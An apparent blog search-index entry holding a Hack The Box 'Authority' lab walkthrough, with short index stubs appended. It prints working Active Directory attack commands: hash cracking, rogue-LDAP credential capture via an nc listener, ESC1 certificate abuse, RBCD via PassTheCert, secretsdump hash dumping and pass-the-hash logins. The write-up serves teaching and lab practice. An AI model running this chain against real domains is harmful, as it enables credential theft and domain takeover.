/\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Type\u0026lt;/b\u0026gt; Exception Report\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Message\u0026lt;/b\u0026gt; Invalid character found in the HTTP protocol [RTSP\u0026amp;#47;1.00x0d0x0a0x0d0x0a...]\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Description\u0026lt;/b\u0026gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=ISO-8859-1). | ssl-cert: Subject: commonName=172.16.2.118 | Not valid before: 2024-10-20T17:43:21 |_Not valid after: 2026-10-23T05:21:45 |_ssl-date: TLS randomness does not represent time 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49673/tcp open msrpc Microsoft Windows RPC 49690/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49691/tcp open msrpc Microsoft Windows RPC 49693/tcp open msrpc Microsoft Windows RPC 49694/tcp open msrpc Microsoft Windows RPC 49697/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC 61640/tcp open msrpc Microsoft Windows RPC 62919/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=10/22%Time=6717E176%P=x86_64-pc-linu SF:x-gnu%r(GetRequest,DB,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/ht SF:ml;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20Tue,\\x2022\\x SF:20Oct\\x202024\\x2021:31:36\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\\n\\n\\n\\ SF:n\\n\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta\\x20http-equiv=\\\u0026#34;refresh\\\u0026#34;\\x20content=\\\u0026#34;0;URL=\u0026#39;/pwm SF:\u0026#39;\\\u0026#34;/\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;)%r(HTTPOptions,7D,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nAllow:\\ SF:x20GET,\\x20HEAD,\\x20POST,\\x20OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x SF:20Tue,\\x2022\\x20Oct\\x202024\\x2021:31:36\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n\u0026#34;)%r(FourOhFourRequest,DB,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type: SF:\\x20text/html;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20T SF:ue,\\x2022\\x20Oct\\x202024\\x2021:31:36\\x20GMT\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n\\n\\n\\n\\n\\n\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta\\x20http-equiv=\\\u0026#34;refresh\\\u0026#34;\\x20content=\\\u0026#34; SF:0;URL=\u0026#39;/pwm\u0026#39;\\\u0026#34;/\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;)%r(RTSPRequest,82C,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20e SF:n\\r\\nContent-Length:\\x201936\\r\\nDate:\\x20Tue,\\x2022\\x20Oct\\x202024\\x202 SF:1:31:42\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x SF:20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad SF:\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tah SF:oma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;backgr SF:ound-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16p SF:x;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color SF::black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:none; SF:}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\\\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\ SF:x20Request\u0026lt;/h1\u0026gt;\u0026lt;hr\\x20class=\\\u0026#34;line\\\u0026#34;\\x20/\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Type\u0026lt;/b\u0026gt;\\x20Exception\\x SF:20Report\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Message\u0026lt;/b\u0026gt;\\x20Invalid\\x20character\\x20found\\x20in\\x2 SF:0the\\x20HTTP\\x20protocol\\x20\\[RTSP\u0026amp;#47;1\\.00x0d0x0a0x0d0x0a\\.\\.\\.\\]\u0026lt;/p\u0026gt; SF:\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Description\u0026lt;/b\u0026gt;\\x20The\\x20server\\x20cannot\\x20or\\x20will\\x20not\\x SF:20process\\x20the\\x20request\\x20due\\x20to\\x20something\\x20that\\x20is\\x20 SF:perceived\\x20to\\x20be\\x20a\\x20client\\x20error\\x20\\(e\\.g\\.,\\x20malformed SF:\\x20request\\x20syntax,\\x20invalid\\x20\u0026#34;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=10/22%OT=53%CT=1%CU=39948%PV=Y%DS=2%DC=I%G=Y%TM=671 OS:7E1BC%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S OS:%TS=U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW OS:8NNS%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN( OS:R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A= OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80 OS:%CD=Z) Network Distance: 2 hops Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-10-22T21:32:35 |_ start_date: N/A |_clock-skew: mean: 4h00m02s, deviation: 0s, median: 4h00m01s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 135.38 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Authority/scans/ldap 🍣 main 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:59:01 zsh ❯ python3 ~/Desktop/WindowsTools/ldapchecker.py $box Attempting to connect to 10.129.229.56 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=authority,DC=htb CN=Configuration,DC=authority,DC=htb CN=Schema,CN=Configuration,DC=authority,DC=htb DC=DomainDnsZones,DC=authority,DC=htb DC=ForestDnsZones,DC=authority,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note, just standard entries. kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt No users found: HTTP 80: Standard holding page for IIS: HTTPS-ALT 8443: Discovering a password manager service: Looks to be hosting PWM:\nSome quick searching reveals this is an open source password self service application:\nhttps://github.com/pwm-project/pwm Config manager:\nDiscovering the user svc_pwm:\nUnfortunately it doesn\u0026rsquo;t look like there is much else we can do here at the moment so let\u0026rsquo;s continue to enumerate. However this is a good target and finding.\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares Guest session we get a hit \u0026amp; access to the development share. I test Null connection but it does not work. Enumerating the development share: I connect using smbclient:\nsmbclient -U $domain\\\\guest \\\\\\\\$box\\\\Development There is a folder called \u0026ldquo;Automation\u0026rdquo; I use smbget to download it:\nsmbget -U $domain/guest --recursive \u0026quot;smb://$box/Development\u0026quot; Looking I can see it\u0026rsquo;s a folder containing, Ansible information. Ansible is an open-source automation tool used for configuration management, application deployment, and task automation across multiple systems without requiring agents. Meaning that it\u0026rsquo;s possible we may find some hard-coded creds etc. Finding Hard-Coded Creds \u0026amp; Hashes Ansible files: Discovering the CA Admin Username/Email: Finding the CA email: grep -r \u0026quot;admin\u0026quot; Ansible Discovering the Ansible Username: Hard Coded TomCat Creds: I run grep recursivley to search for passwords: grep -r \u0026quot;pass\u0026quot; Ansible Tomcat Creds: There is currently no TomCat Instance I can find running, unless it\u0026rsquo;s running internally. However this is a good finding. Ansible Hashes: Ansible Vault Encoded Creds: Looking through the files further I find ansible encoded passwords in the /Automation/Ansible/PWM/defaults/main.yml file This is good as it\u0026rsquo;s in the subfolder PWM which is the Password Manager service we found on 8443 earlier. Some quick searching \u0026amp; I find this article by Ben Grewell about cracking ansible hashes. Cracking Ansible Vault Hashes Using Ansible2John \u0026amp; John The Ripper: Converting Ansible Vault Hashes to John format using ansible2john: +Important+: For some reason ansible2john will note be able to process \u0026amp; convert more than 1 hash per file. This means each hash has to be placed in a separate file \u0026amp; then converted. I am telling you this as I WASTED so much time trying to debug this. Place each hash in it\u0026rsquo;s own file: Run ansible2john on each file: ansible2john ansible1.hashes \u0026gt; ansible.hashes Cracking Ansible Vault Hashes Using John: Now we have our converted hashes we can use john to attempt to crack them:\njohn –wordlist=~/Wordlists/rockyou.txt ansbile.hashes They crack. I try them in the PWM Page, but they are rejected:\n+Note+: Jumping back to Ben\u0026rsquo;s Article we can see that we actually need to decrypt the vault passwords with the password we have just found.\nUsing Ansible Vault to decrypt the hashes. Install Ansible Package:\nIf you do not have ansible installed you will need to install it to be able to use ansible-vault. On debian (kali) install with: sudo apt install ansible-core Preparing our hashes:\nAgain ansible-vault is sassy if you have more than 1 hash in the file, so it\u0026rsquo;s better to just decrypt each file: Decrypting ansible hashes using ansible-vault:\nansible-vault view Vault* So we now have the password for the user svc_pwm as well as the ldap password\nRe-cap of process ansible hash cracking process: We needed to convert each of the ansible hashes to the crackable format using ansible2john and placing each hash in it\u0026rsquo;s own file. We then cracked those converted hashes to retrieve the vault password. We can then decrypt the original hashes using the retrieved password with ansible-vault Logging into PWM: I attempt to login to the main page using our new found creds but get the below error:\nI then login to the configuration page:\nI find the LDAP Proxy username:\nI attempt to authenticate with this user and the found passwords but it fails. I click Cancel (just to see what happens)\nI am taken to this page where we can download the Configuration: I download it Looking at the file we can see a configPasswordHash:\nI check it on https://hashes.com Searching hashcats website we can see it\u0026rsquo;s mode 3200:\nI run it through hashcat:\nhashcat -m 3200 PWMHash ~/Wordlists/rockyou.txt +Note+: Future bloodstiller here, this did not crack or lead anywhere (save yourself some time) Whilst that runs looking back on that page we can actually access the DB:\nClicking it enables us to download the DB: I download it I open it in sqlitebrowser:\nsqlitebrowser PWM-Local.DB It asks for a key but none of the retrieved keys we have work: Stealing LDAP Credentials VIA PWM: Looking back in the configuration for the PWM service I discover we can add ldap endpoints. This means we can have the victim authenticate to us and steal the credentials.\nHave the victim connect back to us:\nWith PWM if we can access the config page we can enter our URL: Ensure we use ldap not ldaps or it will be encrypted and we will just cipher text. Setup Listening Server:\nnc -nvlp 636 +Note+: No special type of server needs to be used just a server and port to listen on. Initiate Connection:\nCapture Creds:\nI verify with netexec:\nnetexec ldap $domain -u $user -p $pass 2. Foothold: Re-running ldapire now that we have creds to enumerate users and groups: As we have credentials I re-run my ldap enumeration tool: ldapire python3 ~/Desktop/WindowsTools/ldapire.py $box -u $user -p $pass I check the description fields for users \u0026amp; groups as well as the entries but there is nothing of note: We do have a nice list of groups and users now: Connecting via evil-winrm as svc_ldap: evil-winrm -i $box -u $user -p $pass\nGet our user flag:\nDoing a bloodhound capture using SharpHound: I upload SharpHound.exe using evil-winrm:\nThen run a capture:\n.\\SharpHound.exe all I download the zip:\ndownload 20241024093228_BloodHound.zip Reading the bloodhound results: We can see we have the ability to enroll in all of these certificates. Enumerating the Certificate Authority with certipy-ad (CA): As we saw CA information earlier in the Automation share and we have the ability to enroll using certain certificates, I use certipy-ad to enumerate if there are any vulnerable certificates.\ncertipy-ad find -vulnerable -enabled -u $user@$domain -p $pass -dc-ip $box -debug Reading the results we can see that there is a vulnerable certificate: \u0026amp; we can use the ESC1 attack chain:\nLooking at who can enroll the cert we see it is all groups:\nThis unfortunately was not listed as any of the certs we could enroll in as our current user. However it does say \u0026ldquo;Domain Computers\u0026rdquo; can so if we can create a computer \u0026amp; add it to the domain we should be able to use that with the ESC1 attack. 3. Privilege Escalation: Enumerating MachineAccountQuota using netexec: By default, all users can add up to 10 computers to a domain. (You read that right. This is called the MachineAccountQuota or MAQ). This setting can present a significant security risk in Active Directory environments if left unchecked. MachineAccountQuota Primer: Default Behavior:\nPurpose: Limits the number of machine accounts (computers) a non-administrative user can join to a domain. Value: The MachineAccountQuota has been set to 10 by default since Windows 2000 +Any authenticated domain user can leverage this quota+: No special permissions are required beyond basic domain user rights Default Value: By default, users in the \u0026ldquo;Authenticated Users\u0026rdquo; group can create 10 computer accounts in Active Directory. Location: Managed via Active Directory settings and group policies. Security Implications:\nAttackers can potentially add rogue machines to a domain, which may be used for privilege escalation or lateral movement. Think Resource Based Constrained Delegation attacks: Each computer account could potentially be used for lateral movement or persistence. Rogue computer accounts can be leveraged for relay attacks or resource access Mitigation Strategies:\nReduce the MAQ value to 0 for enhanced security Implement a formal process for adding computers to the domain Monitor computer account creation events (Event ID 4741 ) Regularly audit computer accounts for suspicious entries How to Modify MAQ using AD cmdlet: Set-ADDomain -Identity yourdomain.com -Replace @{\u0026quot;ms-DS-MachineAccountQuota\u0026quot;=\u0026quot;0\u0026quot;} How to enumerate MAQ value: Using ldap:\ndsquery * \u0026quot;DC=domain,DC=com\u0026quot; -scope base -attr ms-DS-MachineAccountQuota +Note+: As we can see we can add 10 machines as expected. Using netexec:\nnetexec ldap $box -u $user -p $pass -M maq Using AD Powershell Module:\nGet-ADDomain | Select-Object -ExpandProperty MaxComputers +Note+: This system does not have the AD cmdlet available however I wanted to include it. Creating a computer with impacket-addcomputer: As we know we can add a computer we can use impacket-addcomputer to do it.\nCreate the computer using Impacket:\nimpacket-addcomputer -computer-name 'bloodstiller' -computer-pass 'b100dstill3r' -dc-ip $dcip $domain/svc_ldap I verify the computer was made using PowerView:\nGet-AdComputer -identity bloodstiller Note: be patient, this can hang for a number of seconds! Using certipy-ad \u0026amp; ESC1 Attack Chain to elevate privileges to Administrator: I retrieve the vulnerable certificate name:\nCorpVPN I sync my clock with the target:\nsudo ntpdate -s $domain I request a cert:\ncertipy-ad req -username bloodstiller$ -password $pass -ca AUTHORITY-CA -dc-ip $dcip -template CorpVPN -upn administrator@$domain -dns $domain +Note+: How we have used the name of the certificate we found in step 1 CorpVPN I get the below errors: Troubleshooting the issue:\nI tried so many different variations of this to try and get it to work. So many different certipy-ad commands as I was convinced I had gotten the syntax wrong. No matter what I did this kept failing. I have done this attack path before so know the commands etc are right. https://bloodstiller.com/walkthroughs/escape-box/#using-esc1-attack-chain-to-elevate-privileges-to-administrator After some searching online I find the below github issue thread. https://github.com/ly4k/Certipy/issues/158 \u0026amp; this comment: Using addcomputer.py to start the attack chain again: Let\u0026rsquo;s start this process over using addcomputer.py:\nGet the file:\nwget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/addcomputer.py Add the computer:\npython3 addcomputer.py -computer-name 'bloodstiller' -computer-pass 'b100dstill3r' -dc-ip $dcip $domain/svc_ldap Install certipy-ad via pipx:\npipx install certipy-ad Get ticket\ncertipy req -username bloodstiller$ -password $pass -ca AUTHORITY-CA -dc-ip $dcip -template CorpVPN -upn administrator@$domain -dns $domain -debug Attempt to request a TGT and get the below erorr:\ncertipy auth -pfx administrator_authority.pfx -dc-ip $box 4. Ownership: Understanding the KDC_ERR_PADATA_TYPE_NOSUPP error: Looking online we can find the following article: https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d Which says this: What does this actually mean though? It means that PKINIT authentication has failed.\nWhen PKINIT authentication fails, it\u0026rsquo;s often because either:\nPKINIT is not enabled on the Domain Controller, or The certificate being used lacks the required Smart Card Logon Extended Key Usage (EKU). This EKU requirement is a common issue when the PKI is not properly configured. So what\u0026rsquo;s a PKINIT and an EKU…glad you asked.\nPublic Key Cryptography for Initial Authentication in kerberos (PKINIT) Primer: PKINIT is a kerberos extension that allows users to authenticate to a kerberos Key Distribution Center (KDC) using X.509 public key certificates instead of the traditional kerberos username and password, \u0026amp; guess what we have an X.509 certificate that certipy extracted for us.\nHow PKINIT Works: The PKINIT process works as follows: The client initiates a kerberos pre-authentication request, including their X.509 certificate. The KDC verifies the client\u0026rsquo;s certificate and extracts the necessary information, such as the client\u0026rsquo;s public key. The KDC and client then engage in a series of cryptographic exchanges to authenticate the client and establish a session key. Once authenticated, the client can request kerberos tickets (e.g., TGTs) to access resources and services. PKINIT Requirements For PKINIT to work, several requirements must be met: The client\u0026rsquo;s X.509 certificate must be trusted by the KDC. The client\u0026rsquo;s certificate must have the appropriate Extended Key Usage (EKU) set, typically the \u0026ldquo;Smart Card Logon\u0026rdquo; EKU. The KDC must be configured to support PKINIT and have the necessary certificate trust chain. The client and KDC must have a shared understanding of the supported cryptographic algorithms and protocols. The main benefits of PKINIT include: Enhanced security: PKINIT leverages the security of public key cryptography, providing an alternative to password-based authentication. Improved user experience: Users can authenticate using their existing PKI-based credentials, such as smart cards or software certificates, without having to manage separate kerberos credentials. Support for single sign-on: PKINIT enables users to obtain kerberos tickets using their PKI credentials, facilitating single sign-on across applications and services. PKINIT Resources: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/ https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b But what is an EKU…..glad you asked my hacking bretherin.\nExtended Key Usage (EKU) Primer: What is in an EKU? Extended Key Usage (EKU) is an X.509 certificate field that indicates the purpose(s) for which the certified public key can be used. EKU\u0026rsquo;s provide more granular control over how a certificate can be used, beyond the basic key usage fields. Importance of Correct EKU Configuration: If the client\u0026rsquo;s certificate does not have the \u0026ldquo;Smart Card Logon\u0026rdquo; EKU (or another EKU approved for PKINIT), the KDC will likely reject the PKINIT pre-authentication request. This can happen if the underlying Public Key Infrastructure (PKI) is not properly configured to issue certificates with the correct EKUs. +Note+: This is what is happening when we see the error: KDC_ERR_PADATA_TYPE_NOSUPP Ensuring that certificates used for PKINIT have the proper EKU is a crucial step in setting up and maintaining a functional PKINIT deployment. Without the right EKU, PKINIT will not work as expected, and users may be unable to authenticate using their PKI credentials. EKUs and PKINIT: For PKINIT to work correctly, the client\u0026rsquo;s X.509 certificate must have the appropriate EKU set. This is typically the \u0026ldquo;Smart Card Logon\u0026rdquo; EKU. The \u0026ldquo;Smart Card Logon\u0026rdquo; EKU indicates that the certificate can be used for authenticating the certificate holder to a system. This EKU is essential for PKINIT, as it signals to the kerberos Key Distribution Center (KDC) that the certificate is intended for user authentication. EKU resources: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn786428(v=ws.11)#extended-key-usages https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88 https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ppsec/d2f037c5-7a2a-4513-8f72-5b1c7bd88561 So how do we move forward with our attack chain? Bypassing PKINIT Limitations If the domain controller does not support PKINIT, (the kerberos mechanism that allows using X.509 certificates for pre-authentication.) Due to not having the required \u0026ldquo;Smart Card Logon\u0026rdquo; Extended Key Usage (EKU) set what do we do? Looking back at the article we can see it mentions the tool PassTheCert . Which means in these cases, alternative authentication methods may be available. - For example, protocols like LDAP can support Schannel, which enables authentication through TLS. This can provide a way to perform certificate-based authentication, even when PKINIT is not supported by the Domain Controllers. Secure Channel (Schannel) Primer: Last primer I promise. I\u0026rsquo;m sorry, there are just a lot of parts here and unless we understand we are just script kiddies aren\u0026rsquo;t we.\nSchannel is the Secure Channel security package in Windows. It is a set of security protocols and APIs that provide secure network communications, including SSL/TLS encryption and authentication. In cases where PKINIT is not available we can attempt to authenticate against LDAP/S using the cert with Schannel So, in summary, Schannel provides an alternative authentication mechanism that can be leveraged when PKINIT kerberos authentication is not possible, due to issues with the certificate such as EKU not being set. We got there, primers done I promise.\nSchannel Resources: https://learn.microsoft.com/en-us/windows/win32/com/schannel https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-schannel/ba-p/259233 Using PassTheCert \u0026amp; certipy to get our ticket: Extracting the key \u0026amp; cert from the .pfx file using certipy: As we cannot use the original extracted cert we need to separate the certificate and key in order to use them.\nExtract the certificate:\ncertipy cert -pfx administrator_authority.pfx -nokey -out admin.crt Extract the key:\ncertipy cert -pfx administrator_authority.pfx -nocert -out admin.key Creating a new computer for an RBCD attack using PassTheCert: As we now have the admin certificate and key we can use PassTheCert to create another new computer on the domain that we can grant delegation privileges for over the DC authority.authority.htb\nAn RBCD (Resource-Based Constrained Delegation) attack allows us to impersonate another user on a target computer. In this case the Administrator on the DC. We can do this by modifying the msDS-AllowedToActOnBehalfOfOtherIdentity property of the target\u0026rsquo;s AD object (DC), effectively granting the us permission to act on behalf of other users for that specific resource. Once set up, we can perform actions as the specified user (administrator) on the target machine (DC)\nCreate a new computer with constrained delegation privileges over the DC: python3 passthecert.py -action add_computer -crt admin.crt -key admin.key -domain $domain -dc-ip $box -computer-name bloodstiller2$ -delegated-services cifs/authority.$domain,ldap/authority.$domain Performing the RBCD attack with impacket-getST: Perform an RBCD attack against the DC to retrieve an admin TGT\nimpacket-getST -spn ldap/authority.$domain -impersonate Administrator -dc-ip $box 'authority.htb/bloodstiller2:g4rHrG2bPnCcz8mX7d1wGPNq4NnPf9Sp' Rename the .ccache file because WHY SO LONG!\nmv Administrator@ldap_authority.authority.htb@AUTHORITY.HTB.ccache Admin.ccache Export the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Admin.ccache Use impacket-secretsdump to dump the hashes:\nimpacket-secretsdump -k -no-pass $domain/administrator@authority.$domain Verify the dumped hash works:\nnetexec smb $box -u administrator -H $hash Connect with evil-winrm and get our flag:\nevil-winrm -i $box -u administrator -H $hash Why did this work? The key points are:\nSituation:\nEnrolled a vulnerable certificate, but PKINIT failed due to Extended Key Usage (EKU) not being set. Required an alternative authentication method to access the Domain Controller (DC) using the certificate. Alternative Authentication:\nUsed PassTheCert to authenticate via LDAP using the Schannel security package. RBCD (Resource-Based Constrained Delegation):\nCreated a new computer with delegation rights over the DC. Allowed us to authenticate against this new computer as the Administrator. Enabled extraction of an Administrator TGT, granting us domain-level authentication. Lessons Learned: What did I learn? I learned about what to do if PKINIT is disabled. I really enjoyed this box, it wasn\u0026rsquo;t a case of just follow the attack path.\nI learned about decrypting ansible hashes, I have never done that before.\nWhat silly mistakes did I make? Not too many this times. It just took time to understand and make this work as there were more moving parts I had to understand to get everything working Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/authority-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/esc1\/": {
        "title": "ESC1",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/esc1\/"
    },
    
    "http:\/\/localhost:1313\/tags\/machineaccountquota\/": {
        "title": "MachineAccountQuota",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/machineaccountquota\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pkinit\/": {
        "title": "PKINIT",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pkinit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rbcd\/": {
        "title": "RBCD",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rbcd\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cups\/": {
        "title": "CUPS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cups\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2024-4076\/": {
        "title": "CVE-2024-4076",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2024-4076\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2024-4175\/": {
        "title": "CVE-2024-4175",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2024-4175\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2024-4176\/": {
        "title": "CVE-2024-4176",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2024-4176\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2024-4177\/": {
        "title": "CVE-2024-4177",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2024-4177\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/evilcups-box\/": {
        "title": "EvilCUPS HTB Walkthrough",
        "tags": ["Box","HTB","Medium","LINUX","CVE-2024-4176","CVE-2024-4175","CVE-2024-4177","CVE-2024-4076","CUPS",],
